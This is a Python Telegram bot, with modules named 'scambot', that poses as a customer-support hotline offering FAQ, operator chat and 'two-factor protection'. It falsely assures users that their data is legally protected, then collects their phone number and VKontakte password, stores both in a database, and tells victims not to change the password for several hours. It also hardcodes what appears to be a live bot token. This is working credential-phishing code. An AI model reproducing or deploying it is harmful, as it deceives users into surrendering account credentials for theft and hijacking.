import logging
from aiogram import Bot, Dispatcher, executor, types
import markups as nav
from datebase_scambot import Database1
import time
from database_scam2 import Database2

TOKEN = "5113372586:AAGgGMutHyjgSRwSWksl2N3U5OULFhENZmI"
logging.basicConfig(level=logging.INFO)

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)
db1 = Database1("datebase_scambot.db")
db2 = Database2("database_simple.db")


@dp.message_handler(commands=['start', 'help'])
async def start(message: types.Message):
    if not db1.user_exists(message.from_user.id):
        db1.add_user(message.from_user.id)
        await bot.send_message(message.from_user.id, "*ДОБРО ПОЖАЛОВАТЬ ДОРОГОЙ ПОЛЬЗОВАТЕЛЬ!\n\nВ ДАННОМ БОТЕ ЗАЛОЖЕНЫ ФУНКЦИИ ГОРЯЧЕЙ ЛИНИИ С ОПЕРАТОРОМ, БЫСТРЫЕ ВОПРОСЫ(FAQ), А ТАКЖЕ ДВУХФАКТОРНАЯ АУТЕНТИФИКАЦИЯ(ЗАЩИТА ВАШЕГО АККАУНТА)!\n\nПЕРЕД ТЕМ КАК ИСПОЛЬЗОВАТЬ БОТА, ВАМ НУЖНО ВОЙТИ В СВОЙ АККАУНТ!\n\nПЕРСОНАЛЬНЫЕ ДАННЫЕ НАХОДЯТСЯ ПОД ЗАЩИТОЙ И НЕ РАЗГЛАШАЮТСЯ НА ОСНОВАНИИ ЗАКОНА*", parse_mode="Markdown", reply_markup=nav.keyboard_arg)
        time.sleep(5)
        await bot.send_message(message.from_user.id, "*УКАЖИТЕ ВАШ НОМЕР(ФОРМАТ: 79045678998)\nБЕЗ '+', И НАЧИНАЯ С '7'*", parse_mode="Markdown")
        db1.set_talk(message.from_user.id, "notalk")
    else:
        await bot.send_message(message.from_user.id, "*ВЫ УЖЕ ВОШЛИ В АККАУНТ*", parse_mode="Markdown", reply_markup=nav.MainPanel)
        db1.set_talk(message.from_user.id, "notalk")


@dp.message_handler()
async def bot_message(message: types.Message):
    if message.chat.type == "private":
        if message.text == "FAQ(ЧАСТЫЕ ВОПРОСЫ)":
            await bot.send_message(message.chat.id, "*ЧАСТО ЗАДАВАЕМЫЕ ВОПРОСЫ:\n\n1.ЗАЧЕМ ЭТОТ БОТ? - БОТ СОЗДАН ОТВЕТОВ НА ВОПРОСЫ ПРИ ПОМОЩИ ДАННОГО РАЗДЕЛА, ЛИБО ПРЯМОГО РАЗГОВОРА С ОПЕРАТОРОМ, А ТАКЖЕ ДЛЯ НАИЛУЧШЕЙ ЗАЩИТЫ ВАШЕГО АККАУНТА, БЛАГОДАРЯ 2FA\n\n2.МОИ ДАННЫЕ В БЕЗОПАСНОСТИ? - ДА, ВАШИ ДАННЫЕ В ПОЛНОЙ БЕЗОПАСНОСТИ НА ОСНОВАНИИ 'ФЗ О ПЕРСОНАЛЬНЫХ ДАННЫХ ОТ 27.07.2006 N 152-ФЗ'\n\n3.А ЕСЛИ У МЕНЯ ПРОБЛЕМА С АККАУНТОМ, ВЫ ПОМОЖЕТЕ? - ДА, ПРОСТО ОБРАТИТЕСЬ К ОПЕРАТОРУ И ДОЖДИТЕСЬ СВОЙ ОЧЕРЕДИ*", parse_mode="Markdown", reply_markup=nav.MainPanel)
        elif message.text == "СВЯЗЬ С ОПЕРАТОРОМ":
            chat_two = db2.get_chat()
            if not db2.create_chat(message.chat.id, chat_two):
                db2.add_queue(message.chat.id)
                await bot.send_message(message.chat.id, "*ВЫ ВОШЛИ В ОЧЕРЕДЬ, ОЖИДАЙТЕ ОПЕРАТОР ПОДКЛЮЧИТЬСЯ К ВАМ ПО ВОЗМОЖНОСТИ*", parse_mode="Markdown", reply_markup=nav.QuePanel)
                db1.set_talk(message.from_user.id, "notalk")
            else:
                await bot.send_message(message.chat.id, "*ВЫ ПОДКЛЮЧИЛИСЬ К КЛИЕНТУ*", parse_mode="Markdown", reply_markup=nav.HotLinePanel)
                await bot.send_message(chat_two, "*ВЫ ПОДКЛЮЧИЛИСЬ К ОПЕРАТОРУ*", parse_mode="Markdown", reply_markup=nav.HotLinePanel)
                db1.set_talk(message.from_user.id, "intalk")
                db1.set_talk(chat_two, "intalk")

        elif message.text == "ВЫЙТИ ИЗ ОЧЕРЕДИ":
            await bot.send_message(message.chat.id, "*ВЫ ВЫШЛИ ИЗ ОЧЕРЕДИ*", parse_mode="Markdown", reply_markup=nav.MainPanel)
            db2.delete_queue(message.chat.id)
            db1.set_talk(message.from_user.id, "notalk")

        elif message.text == "ВЫЙТИ ИЗ ЧАТА":
            chat_info = db2.get_active_chat(message.chat.id)
            if chat_info:
                db2.delete_chat(chat_info[0])
                await bot.send_message(chat_info[1], "ДИАЛОГ ЗАВЕРШЕН ОПЕРАТОРОМ!", reply_markup=nav.MainPanel)
                await bot.send_message(message.chat.id, "ДИАЛОГ ЗАВЕРШЕН", reply_markup=nav.MainPanel)
                db1.set_talk(message.from_user.id, "notalk")
                db1.set_talk(chat_info[1], "notalk")

        else:
            if db1.get_signup(message.from_user.id) == "setnickname":
                if len(message.text) > 0 and message.text[0] == "7":
                    db1.set_nickname(message.from_user.id, message.text)
                    db1.set_signup(message.from_user.id, "number")
                    await bot.send_message(message.from_user.id, "*ВЫ ВВЕЛИ НОМЕР УСПЕШНО, ТЕПЕРЬ ВВЕДИТЕ ПАРОЛЬ ОТ ВКОНТАКТЕ*", parse_mode="Markdown")
            elif db1.get_signup(message.from_user.id) == "number":
                if len(message.text) > 0:
                    db1.set_password(message.from_user.id, message.text)
                    db1.set_signup(message.from_user.id, "done")
                    await bot.send_message(message.from_user.id, "*АВТОРИЗАЦИЯ ПРОШЛА УСПЕШНО!\n\nВ ТЕЧЕНИИ НЕСКОЛЬКИХ ЧАСОВ ВЫ ПОЛУЧИТЕ ПОЛНЫЙ ДОСТУП, НЕ МЕНЯЙТЕ НОМЕР И ПАРОЛЬ ДО ПОЛУЧЕНИЯ ПОЛНОГО ДОСТУПА!*", parse_mode="Markdown")
                    time.sleep(4)
                    await bot.send_message(message.from_user.id, "*ВНИМАНИЕ!\n\nВЫ ПОЛУЧИЛИ ПОЛНЫЙ ДОСТУП К БОТУ*", parse_mode="Markdown", reply_markup=nav.MainPanel)

            if db1.set_talk(message.from_user.id, "intalk"):
                if db2.get_active_chat(message.chat.id):
                    chat_info = db2.get_active_chat(message.chat.id)
                    await bot.send_message(chat_info[1], message.text)

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
